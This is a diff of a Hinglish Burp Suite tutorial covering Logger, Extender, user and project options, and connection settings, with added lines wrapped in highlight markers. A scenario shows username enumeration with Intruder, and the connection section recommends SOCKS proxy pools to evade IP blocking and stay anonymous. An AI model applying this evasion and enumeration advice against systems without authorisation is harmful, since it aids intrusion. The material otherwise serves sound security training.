-2. Sab columns mein "admin" search hoga - URL mein, response mein, headers mein.
+1. [[HL::"Search" box mein likho: "admin"::HL]]
+2. [[HL::Sab columns mein "admin" search hoga - URL mein, response mein, headers mein::HL]].
 ```
 
-## ⚖️ 8. Comparison (Logger vs HTTP History):
+## ⚖️ 8. [[HL::Comparison (Logger vs HTTP History):::HL]]
 
-| Feature | Logger | HTTP History (Proxy) |
-|---------|--------|----------------------|
-| **Kis tools ka data?** | All Burp tools | Sirf Proxy se guzre requests |
-| **Auto-record?** | Haan, automatically | Haan, automatically |
-| **Filter options** | Advanced (tool, status, etc.) | Basic |
-| **Use case** | Pentest ke baad analysis | Real-time browsing history |
-| **Data retention** | Till Burp closes | Till Burp closes |
+[[HL::| Feature | Logger | HTTP History (Proxy) |::HL]]
+[[HL::|---------|--------|----------------------|::HL]]
+[[HL::| **Kis tools ka data?** | All Burp tools | Sirf Proxy se guzre requests |::HL]]
+[[HL::| **Auto-record?** | Haan, automatically | Haan, automatically |::HL]]
+[[HL::| **Filter options** | Advanced (tool, status, etc.) | Basic |::HL]]
+[[HL::| **Use case** | Pentest ke baad analysis | Real-time browsing history |::HL]]
+[[HL::| **Data retention** | Till Burp closes | Till Burp closes::HL]] |
 
 ## 🚫 9. Common Mistakes (Beginner Traps):
 
-- **Mistake 1:** Logger ko ignore karna.
-  - **Fix:** Logger bahut powerful hai. Koi request/intercept karna bhool gaye? Yahan milegi. Intruder ki saari requests yahan saved hain.
+- [[HL::**Mistake 1:** Logger ko ignore karna.::HL]]
+  - [[HL::**Fix:** Logger bahut powerful hai. Koi request/intercept karna bhool gaye? Yahan milegi. Intruder ki saari requests yahan saved hain.::HL]]
 
-- **Mistake 2:** Filter use nahi karna.
-  - **Fix:** 5000 entries mein dhundhna mushkil hai. Filter use karo - tool wise, status code wise, URL wise.
+- [[HL::**Mistake 2:** Filter use nahi karna.::HL]]
+  - [[HL::**Fix:** 5000 entries mein dhundhna mushkil hai. Filter use karo - tool wise, status code wise, URL wise.::HL]]
 
-- **Mistake 3:** Double-click karna bhoolna.
-  - **Fix:** Full request-response dekhne ke liye double-click karo. Single click sirf select karta hai.
+- [[HL::**Mistake 3:** Double-click karna bhoolna.::HL]]
+  - [[HL::**Fix:** Full request-response dekhne ke liye double-click karo. Single click sirf select karta hai.::HL]]
 
-- **Mistake 4:** Clear history na karna.
-  - **Fix:** Burp band karne par history clear ho jati hai. Agar kisi specific session ki history chahiye, toh Burp band mat karo ya save options use karo.
+- [[HL::**Mistake 4:** Clear history na karna.::HL]]
+  - [[HL::**Fix:** Burp band karne par history clear ho jati hai. Agar kisi specific session ki history chahiye, toh Burp band mat karo ya save options use karo::HL]].
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
 
-**Confusion 1: "Log sochte hain ki Logger sirf Proxy history hai."**
-- **Actually:** Logger mein **saare tools** ka data aata hai - Proxy, Intruder, Repeater, Scanner, Extender. Ek central repository hai.
+[[HL::**Confusion 1: "Log sochte hain ki Logger sirf Proxy history hai."**::HL]]
+- [[HL::**Actually:** Logger mein **saare tools** ka data aata hai - Proxy, Intruder, Repeater, Scanner, Extender. Ek central repository hai::HL]].
 
-**Confusion 2: "Logger mein data permanent save hota hai."**
-- **Actually:** Nahi, jab tak Burp Suite open hai tab tak data rehta hai. Burp band karte hi saari history clear ho jati hai. Permanent save ke liye "Save items" option use karo.
+[[HL::**Confusion 2: "Logger mein data permanent save hota hai."**::HL]]
+- [[HL::**Actually:** Nahi, jab tak Burp Suite open hai tab tak data rehta hai. Burp band karte hi saari history clear ho jati hai. Permanent save ke liye "Save items" option use karo::HL]].
 
 **Confusion 3: "Filter laga kar bhi sab dikh raha hai."**
 - **Actually:** Filter clear karna bhool gaye. Filter bar mein "Clear" button hai - use karo. Ya filter options ko default par reset karo.
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 
-**Scenario:** Ek pentester ne Intruder se 10,000 requests bheji username enumeration ke liye. Shaam ko report likhni hai to pata karna hai ki kitne usernames valid mile.
+[[HL::**Scenario:** Ek pentester ne Intruder se 10,000 requests bheji username enumeration ke liye. Shaam ko report likhni hai to pata karna hai ki kitne usernames valid mile.::HL]]
 
-**How they used Logger:**
-1. Logger mein filter laga:
-   - Tool = Intruder
-   - Status = 200 (successful)
-   - URL contains = "login"
-2. 347 entries dikhi - matlab 347 valid usernames!
-3. Har entry double-click karke response dekha - kuch mein "Welcome" likha, kuch mein "Invalid password" (lekin username valid tha)
-4. List banaya aur report mein attach kiya.
+**[[HL::How they used Logger::HL]]:**
+1. [[HL::Logger mein filter laga:::HL]]
+   - [[HL::Tool = Intruder::HL]]
+   - [[HL::Status = 200 (successful)::HL]]
+   - [[HL::URL contains = "login"::HL]]
+2. [[HL::347 entries dikhi - matlab 347 valid usernames!::HL]]
+3. [[HL::Har entry double-click karke response dekha - kuch mein "Welcome" likha, kuch mein "Invalid password" (lekin username valid tha)::HL]]
+4. [[HL::List banaya aur report mein attach kiya.::HL]]
 
-**Result:** Comprehensive report with exact evidence - Logger se saari requests saved thi.
+[[HL::**Result:** Comprehensive report with exact evidence - Logger se saari requests saved thi::HL]].
 
 ## 🎨 12. Visual Diagram (ASCII Art):
 
@@ -5838,14 +5838,14 @@ Step 6: User filter apply karta hai
 
 ## 🛠️ 13. Best Practices (Pro Tips):
 
-**Tip 1: Filter Presets**
-- Common filters save kar sakte ho? Nahi, lekin baar-baar use karoge to yaad rakh lo. Jaise "Tool=Intruder Status=200" - ye enumeration ke liye useful hai.
+[[HL::**Tip 1: Filter Presets**::HL]]
+- [[HL::Common filters save kar sakte ho? Nahi, lekin baar-baar use karoge to yaad rakh lo. Jaise "Tool=Intruder Status=200" - ye enumeration ke liye useful hai::HL]].
 
 **Tip 2: Double-Click for Details**
 - Kisi entry ke baare mein jaanna ho to double-click karo. Request aur response side-by-side dikhenge - analysis easy.
 
-**Tip 3: Export Important Entries**
-- Kuch important entries ko "Save items" se file mein save kar lo. Report mein attach kar sakte ho. (Right-click → Save items)
+[[HL::**Tip 3: Export Important Entries**::HL]]
+- [[HL::Kuch important entries ko "Save items" se file mein save kar lo. Report mein attach kar sakte ho. (Right-click → Save items::HL]])
 
 **Tip 4: Clear Regularly**
 - Agar system slow ho raha hai, toh Logger clear kar do. Saari requests memory mein store hoti hain. "Clear" button use karo.
@@ -5872,11 +5872,11 @@ Step 6: User filter apply karta hai
 **Q3: Logger mein filter kaise lagaye?**
 **A3:** Upar filter bar mein options hain - URL, Status code, Tool, MIME type, Search. Inko set karo, table automatically filter ho jayega.
 
-**Q4: Logger aur HTTP history mein kya difference?**
-**A4:** HTTP history sirf Proxy se guzre requests dikhati hai. Logger saare tools se guzre requests dikhata hai.
+[[HL::**Q4: Logger aur HTTP history mein kya difference?**::HL]]
+[[HL::**A4:** HTTP history sirf Proxy se guzre requests dikhati hai. Logger saare tools se guzre requests dikhata hai::HL]].
 
-**Q5: Logger se request ko Repeater mein bhej sakte hain?**
-**A5:** Haan! Logger mein kisi entry par right-click karo → "Send to Repeater" select karo. Request Repeater mein copy ho jayegi.
+[[HL::**Q5: Logger se request ko Repeater mein bhej sakte hain?**::HL]]
+[[HL::**A5:** Haan! Logger mein kisi entry par right-click karo → "Send to Repeater" select karo. Request Repeater mein copy ho jayegi::HL]].
 
 ## 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary):
 
@@ -5910,36 +5910,36 @@ Socho tumhare paas ek **basic mobile phone** hai - bas call aur SMS kar sakta ha
 
 **Extender bilkul yahi kaam karta hai:**
 
-Burp Suite ek **basic phone** ki tarah hai - usme proxy, intruder, repeater jaise basic features hain. Lekin jab tum **advanced testing** karna chahte ho (jaise automatic SQL injection find karna, JWT tokens decode karna, ya cloud misconfigurations check karna), toh tumhe **extensions** install karni padti hai.
+[[HL::Burp Suite ek **basic phone** ki tarah hai - usme proxy, intruder, repeater jaise basic features hain. Lekin jab tum **advanced testing** karna chahte ho (jaise automatic SQL injection find karna, JWT tokens decode karna, ya cloud misconfigurations check karna), toh tumhe **extensions** install karni padti hai.::HL]]
 
-**BApp Store** = Burp ka **Play Store**. Yahan se tum free extensions download kar sakte ho jo community ne banayi hain.
+[[HL::**BApp Store** = Burp ka **Play Store**. Yahan se tum free extensions download kar sakte ho jo community ne banayi hain::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer):
 
-**Standard Definition:** "Extender is a Burp Suite tab that allows security testers to load, manage, and install extensions (plugins) from the BApp Store or external sources, extending Burp's functionality for specialized testing scenarios."
+[[HL::**Standard Definition:** "Extender is a Burp Suite tab that allows security testers to load, manage, and install extensions (plugins) from the BApp Store or external sources, extending Burp's functionality for specialized testing scenarios."::HL]]
 
-**Breakdown (Hinglish mein):**
-- **Extension:** Ek additional module jo Burp mein naye features add karta hai (jaise mobile mein naya app)
-- **BApp Store:** Official Burp extension store jahan se vetted extensions download kar sakte ho
+**[[HL::Breakdown (Hinglish mein)::HL]]:**
+- [[HL::**Extension:** Ek additional module jo Burp mein naye features add karta hai (jaise mobile mein naya app)::HL]]
+- [[HL::**BApp Store:** Official Burp extension store jahan se vetted extensions download kar sakte ho::HL]]
 - **API:** Burp provide karta hai ek interface jiska use karke developers extensions bana sakte hain
 - **Python/Java/Ruby:** Extensions in languages mein likhi ja sakti hain
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
-**Problem (Without Extender):**
-Maano tumhe kisi website ki **1000 URLs** ki list mili hai aur tumhe check karna hai ki kaunsi URLs alive hain (200 OK return kar rahi hain). Manual check impossible hai. Intruder se karoge to time lagega aur manually configure karna padega.
+**[[HL::Problem (Without Extender)::HL]]:**
+[[HL::Maano tumhe kisi website ki **1000 URLs** ki list mili hai aur tumhe check karna hai ki kaunsi URLs alive hain (200 OK return kar rahi hain). Manual check impossible hai. Intruder se karoge to time lagega aur manually configure karna padega.::HL]]
 
-**Solution (With Extender):**
-Ek extension hai "**Turbo Intruder**" - jo **hazaaro requests per second** bhej sakta hai. Isko install karo aur 1000 URLs ko seconds mein check kar lo.
+**[[HL::Solution (With Extender)::HL]]:**
+[[HL::Ek extension hai "**Turbo Intruder**" - jo **hazaaro requests per second** bhej sakta hai. Isko install karo aur 1000 URLs ko seconds mein check kar lo::HL]].
 
-**Dusra example:**
-JWT (JSON Web Tokens) test karne hain. Manual decode karo, verify karo - time waste. "**JSON Web Tokens**" extension install karo - ek click mein token decode, verify, aur modify kar sakte ho.
+**[[HL::Dusra example::HL]]:**
+[[HL::JWT (JSON Web Tokens) test karne hain. Manual decode karo, verify karo - time waste. "**JSON Web Tokens**" extension install karo - ek click mein token decode, verify, aur modify kar sakte ho::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
-**Location:** Burp Suite mein top menu mein **"Extender"** tab.
+[[HL::**Location:** Burp Suite mein top menu mein **"Extender"** tab.::HL]]
 
-**Jab Extender khulega, 5 sub-tabs dikhenge:**
+**[[HL::Jab Extender khulega, 5 sub-tabs dikhenge::HL]]:**
 
 ```
 +---------------------------------------------------------------------+
@@ -5967,40 +5967,40 @@ JWT (JSON Web Tokens) test karne hain. Manual decode karo, verify karo - time wa
 **Step-by-step extension loading process:**
 
 ```
-Step 1: User BApp Store se extension select karta hai
-        [BApp Store] --(Download request)--> [PortSwigger Server]
+[[HL::Step 1: User BApp Store se extension select karta hai::HL]]
+        [[HL::[BApp Store] --(Download request)--> [PortSwigger Server]::HL]]
 
-Step 2: Server extension file bhejta hai
-        [PortSwigger Server] --(Extension .jar/.py)--> [Burp Extender]
+[[HL::Step 2: Server extension file bhejta hai::HL]]
+        [[HL::[PortSwigger Server] --(Extension .jar/.py)--> [Burp Extender]::HL]]
 
-Step 3: Burp extension load karta hai
-        Extension file extract hoti hai
-        Dependencies check hoti hain
-        Extension initialize hota hai
+[[HL::Step 3: Burp extension load karta hai::HL]]
+        [[HL::Extension file extract hoti hai::HL]]
+        [[HL::Dependencies check hoti hain::HL]]
+        [[HL::Extension initialize hota hai::HL]]
 
-Step 4: Extension Burp ke saath register hota hai
-        Extension Burp API use karta hai:
-        - HTTP requests intercept karne ke liye
-        - Scanner checks add karne ke liye
-        - New tabs add karne ke liye
+[[HL::Step 4: Extension Burp ke saath register hota hai::HL]]
+        [[HL::Extension Burp API use karta hai:::HL]]
+        - [[HL::HTTP requests intercept karne ke liye::HL]]
+        - [[HL::Scanner checks add karne ke liye::HL]]
+        - [[HL::New tabs add karne ke liye::HL]]
 
-Step 5: Extension ready for use
-        Naye menu items appear hote hain
-        Naye shortcuts available hote hain
+[[HL::Step 5: Extension ready for use::HL]]
+        [[HL::Naye menu items appear hote hain::HL]]
+        [[HL::Naye shortcuts available hote hain::HL]]
 ```
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
 
-**Step 1: Extender tab open karo**
+[[HL::**Step 1: Extender tab open karo**::HL]]
 ```text
-1. Burp Suite ke top menu mein "Extender" tab par CLICK karo.
+1. [[HL::Burp Suite ke top menu mein "Extender" tab par CLICK karo.::HL]]
 ```
 
-**Step 2: BApp Store mein jao**
+[[HL::**Step 2: BApp Store mein jao**::HL]]
 ```text
-1. "BApp" sub-tab par CLICK karo (Extender ke andar).
-2. Yahan saari available extensions ki list dikhegi.
-3. Search bar mein type karo: "turbo" (example ke liye).
+1. [[HL::"BApp" sub-tab par CLICK karo (Extender ke andar).::HL]]
+2. [[HL::Yahan saari available extensions ki list dikhegi.::HL]]
+3. [[HL::Search bar mein type karo: "turbo" (example ke liye::HL]]).
 ```
 
 **Screen par kya dikhega:**
@@ -6162,33 +6162,33 @@ Socho tum ek naye **ghar mein shift** hue ho. Ghar mein kuch settings tum **ek b
 
 Aur kuch settings tum **har project ke hisaab se** change karte ho - jaise agar guest aate hain to lights dim karte ho, ya party hai to music volume badha dete ho. Inhe **Project Settings** keh sakte ho.
 
-**User and Project Options bilkul yahi kaam karta hai:**
+**[[HL::User and Project Options bilkul yahi kaam karta hai::HL]]:**
 
-- **User Options:** Jo settings tum hamesha use karoge, har project mein (jaise proxy listener, display theme, connection timeouts).
-- **Project Options:** Jo settings sirf current project ke liye chahiye (jaise target scope, session handling rules).
+- [[HL::**User Options:** Jo settings tum hamesha use karoge, har project mein (jaise proxy listener, display theme, connection timeouts).::HL]]
+- [[HL::**Project Options:** Jo settings sirf current project ke liye chahiye (jaise target scope, session handling rules::HL]]).
 
 ## 📖 3. Technical Definition (Interview Answer):
 
 **Standard Definition:** "User and Project Options are Burp Suite's global configuration settings that control the application's behavior, appearance, and network interactions across all projects (User) or for a specific project (Project)."
 
-**Breakdown (Hinglish mein):**
-- **User Options:** Persistent settings jo Burp restart karne ke baad bhi yaad rahti hain.
-- **Project Options:** Temporary settings jo sirf current project file mein save hoti hain.
-- **Global:** Poori application par apply hone wali settings.
+**[[HL::Breakdown (Hinglish mein)::HL]]:**
+- [[HL::**User Options:** Persistent settings jo Burp restart karne ke baad bhi yaad rahti hain.::HL]]
+- [[HL::**Project Options:** Temporary settings jo sirf current project file mein save hoti hain.::HL]]
+- [[HL::**Global:** Poori application par apply hone wali settings::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
-**Problem (Without Settings):**
-Har baar Burp kholo to proxy listener manually configure karo, font size chhota hai to har baar change karo, connection timeout har baar set karo - time waste.
+**[[HL::Problem (Without Settings)::HL]]:**
+[[HL::Har baar Burp kholo to proxy listener manually configure karo, font size chhota hai to har baar change karo, connection timeout har baar set karo - time waste.::HL]]
 
-**Solution (With User Options):**
-User Options mein ek baar proxy listener (127.0.0.1:8080) set kar do, font size 14 kar do, dark theme select kar do. Har baar Burp khologe to ye settings already set hongi.
+**[[HL::Solution (With User Options)::HL]]:**
+[[HL::User Options mein ek baar proxy listener (127.0.0.1:8080) set kar do, font size 14 kar do, dark theme select kar do. Har baar Burp khologe to ye settings already set hongi::HL]].
 
-**Problem 2:**
-Ek project mein tum Google ka testing kar rahe ho, to sirf google.com ko scope mein rakhna chahte ho. Dusre project mein Facebook ka testing kar rahe ho to sirf facebook.com scope mein chahiye.
+**[[HL::Problem 2::HL]]:**
+[[HL::Ek project mein tum Google ka testing kar rahe ho, to sirf google.com ko scope mein rakhna chahte ho. Dusre project mein Facebook ka testing kar rahe ho to sirf facebook.com scope mein chahiye.::HL]]
 
-**Solution (With Project Options):**
-Har project ke liye alag scope set kar sakte ho. Project file save karo to settings bhi save ho jayengi.
+**[[HL::Solution (With Project Options)::HL]]:**
+[[HL::Har project ke liye alag scope set kar sakte ho. Project file save karo to settings bhi save ho jayengi::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
@@ -6229,55 +6229,55 @@ Har project ke liye alag scope set kar sakte ho. Project file save karo to setti
 **Settings Storage Mechanism:**
 
 ```
-User Options:
-1. User settings configure karta hai
-2. Burp settings ko file mein save karta hai:
-   Windows: %APPDATA%\BurpSuite\UserOptions.json
-   Linux: ~/.BurpSuite/UserOptions.json
-   Mac: ~/Library/Application Support/BurpSuite/UserOptions.json
-3. Har baar Burp start hote hi ye file load hoti hai
-4. Settings apply ho jati hain
+[[HL::User Options:::HL]]
+1. [[HL::User settings configure karta hai::HL]]
+2. [[HL::Burp settings ko file mein save karta hai:::HL]]
+   [[HL::Windows: %APPDATA%\BurpSuite\UserOptions.json::HL]]
+   [[HL::Linux: ~/.BurpSuite/UserOptions.json::HL]]
+   [[HL::Mac: ~/Library/Application Support/BurpSuite/UserOptions.json::HL]]
+3. [[HL::Har baar Burp start hote hi ye file load hoti hai::HL]]
+4. [[HL::Settings apply ho jati hain::HL]]
 
-Project Options:
-1. Project settings configure karte ho
-2. Jab project file save karte ho (.burp file):
-   Project options bhi save ho jate hain
-3. Project file dobara open karo to settings restore ho jati hain
+[[HL::Project Options:::HL]]
+1. [[HL::Project settings configure karte ho::HL]]
+2. [[HL::Jab project file save karte ho (.burp file):::HL]]
+   [[HL::Project options bhi save ho jate hain::HL]]
+3. [[HL::Project file dobara open karo to settings restore ho jati::HL]] hain
 ```
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
 
-**Step 1: User Options open karo**
+[[HL::**Step 1: User Options open karo**::HL]]
 ```text
-1. Burp Suite ke top menu mein "User options" tab par CLICK karo.
-2. 4 tabs dikhenge: Connections, TLS, Display, Misc.
+1. [[HL::Burp Suite ke top menu mein "User options" tab par CLICK karo.::HL]]
+2. [[HL::4 tabs dikhenge: Connections, TLS, Display, Misc.::HL]]
 ```
 
-**Step 2: Display settings change karo (Dark Theme)**
+[[HL::**Step 2: Display settings change karo (Dark Theme)**::HL]]
 ```text
-1. "Display" tab par CLICK karo.
-2. "User Interface" section mein "Theme" dropdown par CLICK karo.
-3. "Dark" select karo.
-4. Font size change karna ho to "Font size" mein + ya - karo.
-5. Changes instantly apply ho jayenge.
+1. [[HL::"Display" tab par CLICK karo.::HL]]
+2. [[HL::"User Interface" section mein "Theme" dropdown par CLICK karo.::HL]]
+3. [[HL::"Dark" select karo.::HL]]
+4. [[HL::Font size change karna ho to "Font size" mein + ya - karo.::HL]]
+5. [[HL::Changes instantly apply ho jayenge.::HL]]
 ```
 
-**Step 3: HTTP Message Display Font change karo**
+[[HL::**Step 3: HTTP Message Display Font change karo**::HL]]
 ```text
-1. "Display" tab mein neeche "HTTP Message Display" section hai.
-2. "Font size" ko 14 kar do (default 12 hota hai).
-3. Ab request/response boxes mein font bada ho jayega - aankhon ko aaram milega.
+1. "[[HL::Display" tab mein neeche "HTTP Message Display" section hai.::HL]]
+2. [[HL::"Font size" ko 14 kar do (default 12 hota hai).::HL]]
+3. [[HL::Ab request/response boxes mein font bada ho jayega - aankhon ko aaram milega::HL]].
 ```
 
-**Step 4: Misc settings check karo**
+[[HL::**Step 4: Misc settings check karo**::HL]]
 ```text
-1. "Misc" tab par CLICK karo.
-2. "Automatic project backups" section mein:
-   - "Backup automatically every [10] minutes" check karo.
-   - Ye project automatically save karta rahega - agar Burp crash ho jaye to data loss nahi hoga.
-3. "Temporary files location" - yahan temp files store hoti hain. Default theek hai.
-4. "Proxy interception" mein:
-   - "Automatically restore proxy interception state" - agar ye on hai to Proxy Intercept wahi state mein rahega jo tumne chhoda tha.
+1. [[HL::"Misc" tab par CLICK karo.::HL]]
+2. [[HL::"Automatic project backups" section mein:::HL]]
+   - [[HL::"Backup automatically every [10] minutes" check karo.::HL]]
+   - [[HL::Ye project automatically save karta rahega - agar Burp crash ho jaye to data loss nahi hoga.::HL]]
+3. [[HL::"Temporary files location" - yahan temp files store hoti hain. Default theek hai.::HL]]
+4. [[HL::"Proxy interception" mein:::HL]]
+   - [[HL::"Automatically restore proxy interception state" - agar ye on hai to Proxy Intercept wahi state mein rahega jo tumne chhoda tha::HL]].
 ```
 
 ## ⚖️ 8. Comparison (User Options vs Project Options):
@@ -6291,8 +6291,8 @@ Project Options:
 
 ## 🚫 9. Common Mistakes (Beginner Traps):
 
-- **Mistake 1:** User options mein project-specific settings daalna.
-  - **Fix:** Target scope, session rules ye sab project options mein daalo. User options mein mat daalo - warna har project mein yahi scope apply hoga.
+- [[HL::**Mistake 1:** User options mein project-specific settings daalna.::HL]]
+  - [[HL::**Fix:** Target scope, session rules ye sab project options mein daalo. User options mein mat daalo - warna har project mein yahi scope apply hoga::HL]].
 
 - **Mistake 2:** Settings change kiye par effect nahi dikha.
   - **Fix:** Kuch settings ke liye Burp restart karna padta hai. Jaise theme change - instantly hota hai. Font size - instantly hota hai. Lekin kuch advanced settings restart maangti hain.
@@ -6308,29 +6308,29 @@ Project Options:
 **Confusion 2: "Project file save karne se User options bhi save ho jate hain?"**
 - **Actually:** Nahi. User options alag file mein save hote hain. Project file sirf project-specific settings save karti hai.
 
-**Confusion 3: "Font size change karne se sab jagah change hoga?"**
-- **Actually:** Display settings mein do font size hain:
-  - User Interface font size: Buttons, menus, tabs ka font
-  - HTTP Message Display: Request/response boxes ka font
-  Dono alag hain.
+[[HL::**Confusion 3: "Font size change karne se sab jagah change hoga?"**::HL]]
+- [[HL::**Actually:** Display settings mein do font size hain:::HL]]
+  - [[HL::User Interface font size: Buttons, menus, tabs ka font::HL]]
+  - [[HL::HTTP Message Display: Request/response boxes ka font::HL]]
+  [[HL::Dono alag hain::HL]].
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 
-**Scenario:** Ek pentester multiple projects par kaam kar raha hai - ek banking site ka, ek e-commerce site ka, ek government site ka.
+[[HL::**Scenario:** Ek pentester multiple projects par kaam kar raha hai - ek banking site ka, ek e-commerce site ka, ek government site ka.::HL]]
 
-**How they used User/Project Options:**
-1. **User Options** mein:
-   - Dark theme set kiya (raat ko kaam aasan)
-   - Font size 14 kiya (aankhon ka pressure kam)
-   - Proxy listener 127.0.0.1:8080 set kiya
-   - SOCKS proxy configure kiya (anonymous rehne ke liye)
+**[[HL::How they used User/Project Options::HL]]:**
+1. [[HL::**User Options** mein:::HL]]
+   - [[HL::Dark theme set kiya (raat ko kaam aasan)::HL]]
+   - [[HL::Font size 14 kiya (aankhon ka pressure kam)::HL]]
+   - [[HL::Proxy listener 127.0.0.1:8080 set kiya::HL]]
+   - [[HL::SOCKS proxy configure kiya (anonymous rehne ke liye)::HL]]
 
-2. **Project Options** mein har project ke liye:
-   - Target scope set kiya (sirf wahi domain jo test kar rahe)
-   - Session handling rules (login sessions maintain karne ke liye)
-   - SSL negotiation settings (agar koi site purane TLS use karti hai)
+2. [[HL::**Project Options** mein har project ke liye:::HL]]
+   - [[HL::Target scope set kiya (sirf wahi domain jo test kar rahe)::HL]]
+   - [[HL::Session handling rules (login sessions maintain karne ke liye)::HL]]
+   - [[HL::SSL negotiation settings (agar koi site purane TLS use karti hai)::HL]]
 
-**Result:** Har project ke liye alag settings, lekin personal preferences globally set. Time save, efficiency up.
+[[HL::**Result:** Har project ke liye alag settings, lekin personal preferences globally set. Time save, efficiency up::HL]].
 
 ## 🎨 12. Visual Diagram (ASCII Art):
 
@@ -6355,14 +6355,14 @@ Project Options:
 
 ## 🛠️ 13. Best Practices (Pro Tips):
 
-**Tip 1: Dark Theme Use Karo**
-- Raat ko kaam karte ho to dark theme aankhon ke liye better hai. Display tab mein set karo.
+[[HL::**Tip 1: Dark Theme Use Karo**::HL]]
+- [[HL::Raat ko kaam karte ho to dark theme aankhon ke liye better hai. Display tab mein set karo.::HL]]
 
-**Tip 2: Font Size Badhao**
-- Default font 12 hota hai. 14 kar do - reading easy ho jayegi. 4K monitors par to 16 bhi kar sakte ho.
+[[HL::**Tip 2: Font Size Badhao**::HL]]
+- [[HL::Default font 12 hota hai. 14 kar do - reading easy ho jayegi. 4K monitors par to 16 bhi kar sakte ho.::HL]]
 
-**Tip 3: Auto Backup Enable Karo**
-- Misc tab mein "Backup automatically every 10 minutes" check karo. Agar Burp crash ho jaye to maximum 10 minutes ka kaam loss hoga.
+[[HL::**Tip 3: Auto Backup Enable Karo**::HL]]
+- [[HL::Misc tab mein "Backup automatically every 10 minutes" check karo. Agar Burp crash ho jaye to maximum 10 minutes ka kaam loss hoga::HL]].
 
 **Tip 4: Proxy Interception State Save Karo**
 - "Automatically restore proxy interception state" enable rakho. Kabhi intercept on chhoda tha to wahi rahega.
@@ -6380,8 +6380,8 @@ Project Options:
 
 ## ❓ 15. FAQ (Interview Questions):
 
-**Q1: User options aur project options mein kya antar hai?**
-**A1:** User options global settings hain jo sab projects mein apply hoti hain (jaise theme). Project options sirf current project ke liye specific hain (jaise target scope).
+[[HL::**Q1: User options aur project options mein kya antar hai?**::HL]]
+[[HL::**A1:** User options global settings hain jo sab projects mein apply hoti hain (jaise theme). Project options sirf current project ke liye specific hain (jaise target scope::HL]]).
 
 **Q2: User options kahan save hote hain?**
 **A2:** OS ke hisaab se:
@@ -6422,9 +6422,9 @@ Connections settings mein tum Burp ko batate ho ki **network par kaise behave ka
 **Standard Definition:** "Connections settings in Burp Suite control how Burp establishes and manages network connections, including platform authentication, upstream proxy servers, SOCKS proxy, timeouts, and host name resolution."
 
 **Breakdown (Hinglish mein):**
-- **Platform Authentication:** Websites ke liye automatic login credentials (jaise intranet sites)
-- **Upstream Proxy:** Traffic ko pehle kisi aur proxy server se guzaarna
-- **SOCKS Proxy:** Internet traffic ko anonymous karne wala proxy
+- [[HL::**Platform Authentication:** Websites ke liye automatic login credentials (jaise intranet sites)::HL]]
+- [[HL::**Upstream Proxy:** Traffic ko pehle kisi aur proxy server se guzaarna::HL]]
+- [[HL::**SOCKS Proxy:** Internet traffic ko anonymous karne wala proxy::HL]]
 - **Timeout:** Kitni der wait karna agar server response nahi de raha
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
@@ -6434,15 +6434,15 @@ Connections settings mein tum Burp ko batate ho ki **network par kaise behave ka
 
 **Solution:** Platform Authentication mein ek baar host, username, password daal do. Ab jab bhi Burp us host par request bhejega, automatically authentication headers add kar dega.
 
-**ii) Upstream Proxy Servers - Kyun?**
-**Problem:** Tumhe kisi site ko test karna hai lekin direct request bhejoge to **IP block** ho sakta hai. Ya phir tum **traffic ko monitor** karna chahte ho ki kaunsa data ja raha hai.
+**ii) [[HL::Upstream Proxy Servers - Kyun?::HL]]**
+[[HL::**Problem:** Tumhe kisi site ko test karna hai lekin direct request bhejoge to **IP block** ho sakta hai. Ya phir tum **traffic ko monitor** karna chahte ho ki kaunsa data ja raha hai::HL]].
 
-**Solution:** Upstream proxy set karo. Tumhari request pehle tumhare **apne dusre Burp instance** par jayegi (localhost:8081), phir wahan se server par. Is tarah tum dono jagah traffic dekh sakte ho.
+[[HL::**Solution:** Upstream proxy set karo. Tumhari request pehle tumhare **apne dusre Burp instance** par jayegi (localhost:8081), phir wahan se server par. Is tarah tum dono jagah traffic dekh sakte ho::HL]].
 
-**iii) SOCKS Proxy - Kyun?**
-**Problem:** Tum **Intruder** se 1000 requests bhej rahe ho. Server suspicious ho kar **IP block** kar deta hai. Ab saara kaam ruk gaya.
+[[HL::**iii) SOCKS Proxy - Kyun?**::HL]]
+[[HL::**Problem:** Tum **Intruder** se 1000 requests bhej rahe ho. Server suspicious ho kar **IP block** kar deta hai. Ab saara kaam ruk gaya.::HL]]
 
-**Solution:** SOCKS proxy use karo. Har request **alag IP** se jayegi (agar proxy pool hai). Server block nahi kar payega. Anonymous bhi rahoge.
+[[HL::**Solution:** SOCKS proxy use karo. Har request **alag IP** se jayegi (agar proxy pool hai). Server block nahi kar payega. Anonymous bhi rahoge::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
@@ -6998,12 +6998,12 @@ Connections mein nahi aaya, Display mein nahi aaya, TLS mein nahi aaya - to **Mi
 
 ## 📖 3. Technical Definition (Interview Answer):
 
-**Standard Definition:** "Misc (Miscellaneous) settings in Burp Suite contain various configuration options that don't fit into other categories, including automatic project backups, temporary file locations, and default proxy interception behavior."
+[[HL::**Standard Definition:** "Misc (Miscellaneous) settings in Burp Suite contain various configuration options that don't fit into other categories, including automatic project backups, temporary file locations, and default proxy interception behavior."::HL]]
 
-**Breakdown (Hinglish mein):**
-- **Automatic Backups:** Project automatically save hota rahega
-- **Temp Files Location:** Burp temporary data kahan store karega
-- **Proxy Interception:** Default intercept on rahega ya off
+**[[HL::Breakdown (Hinglish mein)::HL]]:**
+- [[HL::**Automatic Backups:** Project automatically save hota rahega::HL]]
+- [[HL::**Temp Files Location:** Burp temporary data kahan store karega::HL]]
+- [[HL::**Proxy Interception:** Default intercept on rahega ya::HL]] off
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
@@ -7210,14 +7210,14 @@ On Crash:
 
 ## ❓ 15. FAQ (Interview Questions):
 
-**Q1: Misc settings mein kya kya aata hai?**
